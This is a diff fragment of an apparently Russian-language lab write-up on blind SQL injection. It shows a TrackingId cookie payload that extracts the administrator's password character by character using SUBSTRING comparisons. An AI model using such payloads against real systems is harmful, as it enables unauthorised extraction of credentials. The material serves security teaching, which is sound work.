@@ -52,9 +52,11 @@ AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1
 Это можно было посмотреть и вручную, меняя руками число для сравнения, а различие в поведении можно было обнаружить в месте, где сообщение `Welcome Back!` не обнаруживается в коде страницы.
 
 После того, как мы обнаружили длину пароля, переходим к Brutforce пароля:
+Делаем запрос
 
 ```sql
 Cookie: TrackingId=4B50SuDbzQLs2Z2P' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--
 ```
+
 
 
